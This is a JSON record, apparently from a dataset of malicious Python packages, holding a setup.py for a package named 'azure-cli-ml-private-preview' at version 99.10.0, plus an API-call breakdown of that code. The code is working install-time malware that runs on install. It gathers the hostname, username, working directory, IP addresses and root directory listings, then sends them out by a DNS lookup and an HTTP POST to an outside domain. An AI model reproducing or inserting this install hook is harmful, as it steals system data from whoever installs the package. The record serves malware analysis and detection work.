[
  {
    "pyfile": "setup.py",
    "code_snippet": "import requests\nimport socket\nimport getpass\nimport os\nimport json\nimport sys\ntry:\n    import netifaces\nexcept:\n    pass\n\npname=\"azure-cli-ml-private-preview\"\n\ndef getFiles(paths):\n    ufiles = []\n    for mpath in paths:\n        try:\n            files = os.listdir(mpath)\n            for ufile in files:\n                ufiles.append(os.path.join(mpath,ufile))\n        except:\n            pass\n    return ufiles\n\ndef isprivate(ip):\n   if ip.startswith('fe80::') or ip == \"::1\":\n       return True\n   parts = ip.split('.')\n   return parts[0] == '10' or (parts[0] == '172' and (int(parts[1]) >= 16 and int(parts[1]) <= 31)) or (parts[0] == '192' and parts[1] == '168') or (parts[0] == '127' and parts[1] == '0' and parts[2] == '0')\n\ndef todashedip(ip):\n    return ip.replace('.','-').replace(':','-')\n\ndef gethttpips():\n    addresses = []\n    try:\n        addresses=[netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses+=[netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    return addresses\n\ndef getIps():\n    addresses = []\n    result = []\n    try:\n        addresses=[netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses+=[netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    for addr in addresses:\n        if not isprivate(addr):\n            result.append(addr)\n            if \".\" in addr:\n                return \"i.\"+todashedip(addr)+\".i\"\n    if len(result)>0:\n        return \"i.\"+todashedip(result[0])+\".i\"\n    else:\n        return \"i._.i\"\n    \n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        try:\n            dn = \"\"\n            hn = hostname.encode().hex()\n            un = username.encode().hex()\n            pn = pname.encode().hex()\n            ip = getIps()\n            dn = hn+\".\"+pn+\".\"+un+\".p\"\n            cs = cwd.split('/')\n            for i in range(len(cs)):\n                cs[i] = cs[i].encode().hex()\n            path = \"\"\n            for c in cs:\n                if c != \"\" and c != None:\n                    path = path+\".\"+c\n            path = path.strip('.')\n            dn = dn+\".\"+path+\".p\"\n            dn = dn+\".\"+ip\n            dn = dn+\".425a2.rt11.ml\"\n            socket.gethostbyname(dn)\n        except Exception as e:\n            print(\"exception\")\n            print(e)\n            pass\n        ploads = {\"msg\":json.dumps({'hostname':hostname,'cwd':cwd,'username':username,\"ipaddresses\":json.dumps(gethttpips()),\"dirs\":json.dumps(getFiles([\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"]))})}\n        requests.post(\"https://425a2.rt11.ml\",data = ploads)\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.listdir",
        "os.path.join",
        "netifaces.interfaces",
        "netifaces.ifaddresses",
        "netifaces.ifaddresses",
        "netifaces.ifaddresses",
        "netifaces.ifaddresses",
        "socket.gethostname",
        "os.getcwd",
        "getpass.getuser",
        "str.encode",
        "str.encode",
        "str.encode",
        "getIps",
        "str.encode",
        "os.getcwd",
        "str.encode",
        "socket.gethostbyname",
        "json.dumps",
        "json.dumps",
        "gethttpips",
        "json.dumps",
        "getFiles",
        "requests.post"
      ],
      "api_sequence_with_args": [
        "os.listdir(mpath)",
        "os.path.join(mpath, ufile)",
        "netifaces.interfaces()",
        "netifaces.ifaddresses(iface)",
        "netifaces.ifaddresses(iface)",
        "netifaces.ifaddresses(iface)",
        "netifaces.ifaddresses(iface)",
        "socket.gethostname()",
        "os.getcwd()",
        "getpass.getuser()",
        "hostname.encode()",
        "username.encode()",
        "pname.encode()",
        "getIps()",
        "c.encode()",
        "os.getcwd().split('/')",
        "c.encode().hex()",
        "socket.gethostbyname(dn)",
        "json.dumps({'hostname':hostname,'cwd':cwd,'username':username,\"ipaddresses\":json.dumps(gethttpips()),\"dirs\":json.dumps(getFiles([\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"]))})",
        "json.dumps(gethttpips())",
        "gethttpips()",
        "json.dumps(getFiles([\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"]))",
        "getFiles([\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"])",
        "requests.post(\"https://425a2.rt11.ml\", data=ploads)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "netifaces.interfaces",
          "id": "list_network_interfaces",
          "description": "Returns list of network interface indices and names",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "netifaces.ifaddresses",
          "id": "list_network_interfaces",
          "description": "Returns list of network interface indices and names",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "getIps",
          "id": "get_public_ip",
          "description": "Retrieves public IP address using HTTP request",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "def getFiles(paths):\n    ufiles = []\n    for mpath in paths:\n        try:\n            files = os.listdir(mpath)\n            for ufile in files:\n                ufiles.append(os.path.join(mpath, ufile))\n        except:\n            pass\n    return ufiles\n\ndef gethttpips():\n    addresses = []\n    try:\n        addresses = [netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses += [netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    return addresses\n\ndef getIps():\n    addresses = []\n    result = []\n    try:\n        addresses = [netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses += [netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    for addr in addresses:\n        if not isprivate(addr):\n            result.append(addr)\n            if \".\" in addr:\n                return \"i.\" + todashedip(addr) + \".i\"\n    if len(result) > 0:\n        return \"i.\" + todashedip(result[0]) + \".i\"\n    else:\n        return \"i._.i\"\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname = socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        try:\n            dn = \"\"\n            hn = hostname.encode().hex()\n            un = username.encode().hex()\n            pn = pname.encode().hex()\n            ip = getIps()\n            dn = hn + \".\" + pn + \".\" + un + \".p\"\n            cs = cwd.split('/')\n            for i in range(len(cs)):\n                cs[i] = cs[i].encode().hex()\n            path = \"\"\n            for c in cs:\n                if c != \"\" and c != None:\n                    path = path + \".\" + c\n            path = path.strip('.')\n            dn = dn + \".\" + path + \".p\"\n            dn = dn + \".\" + ip\n            dn = dn + \".425a2.rt11.ml\"\n            socket.gethostbyname(dn)\n        except Exception as e:\n            print(\"exception\")\n            print(e)\n            pass\n        ploads = {\"msg\": json.dumps({'hostname': hostname, 'cwd': cwd, 'username': username, \"ipaddresses\": json.dumps(gethttpips()), \"dirs\": json.dumps(getFiles([\"c:\\\\\", \"d:\\\\\", \"/\", \"/home\"]))})}\n        requests.post(\"https://425a2.rt11.ml\", data=ploads)"
    }
  },
  {
    "metadata": {
      "package_name": "azure-cli-ml-private-preview-99.10.0"
    }
  }
]